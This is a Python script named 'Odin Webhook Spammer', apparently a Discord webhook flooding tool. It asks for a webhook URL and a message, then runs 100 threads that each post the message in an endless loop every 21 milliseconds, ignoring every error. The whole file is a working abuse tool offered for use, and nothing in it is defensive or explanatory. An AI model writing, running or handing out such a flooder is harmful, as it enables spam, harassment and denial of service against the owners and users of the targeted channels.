# Odin Webhook Spammer

import subprocess
import sys
import os

def clear():
    if os.name == 'nt':
        os.system('cls')
        os.system('title Odin Spammer')
    else:
        os.system('clear')
        sys.stdout.write('\x1b]2;Odin Spammer\x07')

def set_title():
    if os.name == 'nt':
        os.system('title Odin Spammer')
    else:
        sys.stdout.write('\x1b]2;Odin Spammer\x07')

def install_requirements():
    try:
        required_packages = ['requests']
        subprocess.check_call([sys.executable, '-m', 'pip', 'install'] + required_packages)
        print("Successfully installed requirements")
        time.sleep(1)
        clear()
        set_title()
    except Exception as e:
        print(f"Error installing requirements: {e}")
        sys.exit(1)

try:
    import requests
    import threading
    import time
    from concurrent.futures import ThreadPoolExecutor
except ImportError:
    install_requirements()
    import requests
    import threading
    import time
    from concurrent.futures import ThreadPoolExecutor

def banner():
   print(f"""

   ______   _______   ______  __    __         ______   _______    ______   __       __  __       __  ________  _______  
  /      \ /       \ /      |/  \  /  |       /      \ /       \  /      \ /  \     /  |/  \     /  |/        |/       \ 
 /$$$$$$  |$$$$$$$  |$$$$$$/ $$  \ $$ |      /$$$$$$  |$$$$$$$  |/$$$$$$  |$$  \   /$$ |$$  \   /$$ |$$$$$$$$/ $$$$$$$  |
 $$ |  $$ |$$ |  $$ |  $$ |  $$$  \$$ |      $$ \__$$/ $$ |__$$ |$$ |__$$ |$$$  \ /$$$ |$$$  \ /$$$ |$$ |__    $$ |__$$ |
 $$ |  $$ |$$ |  $$ |  $$ |  $$$$  $$ |      $$      \ $$    $$/ $$    $$ |$$$$  /$$$$ |$$$$  /$$$$ |$$    |   $$    $$< 
 $$ |  $$ |$$ |  $$ |  $$ |  $$ $$ $$ |       $$$$$$  |$$$$$$$/  $$$$$$$$ |$$ $$ $$/$$ |$$ $$ $$/$$ |$$$$$/    $$$$$$$  |
 $$ \__$$ |$$ |__$$ | _$$ |_ $$ |$$$$ |      /  \__$$ |$$ |      $$ |  $$ |$$ |$$$/ $$ |$$ |$$$/ $$ |$$ |_____ $$ |  $$ |
 $$    $$/ $$    $$/ / $$   |$$ | $$$ |      $$    $$/ $$ |      $$ |  $$ |$$ | $/  $$ |$$ | $/  $$ |$$       |$$ |  $$ |
  $$$$$$/  $$$$$$$/  $$$$$$/ $$/   $$/        $$$$$$/  $$/       $$/   $$/ $$/      $$/ $$/      $$/ $$$$$$$$/ $$/   $$/ 





ODIN WEBHOOK SPAMMER - made by vro
credits - @e9jq on discord
"""
)

def spam_single(webhook_url, message):
    while True:
        try:
            response = requests.post(webhook_url, json={"content": message}, timeout=1)
            print("\033[32m[+] Message sent!\033[0m")
            time.sleep(0.021)  # 21ms delay
        except:
            continue

def spam_webhook(webhook_url, message):
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(spam_single, webhook_url, message) for _ in range(100)]

if __name__ == "__main__":
   set_title()
   banner()
   webhook_url = input("Enter the webhook URL: ")
   spam_webhook(webhook_url, input("Enter the message to spam: "))
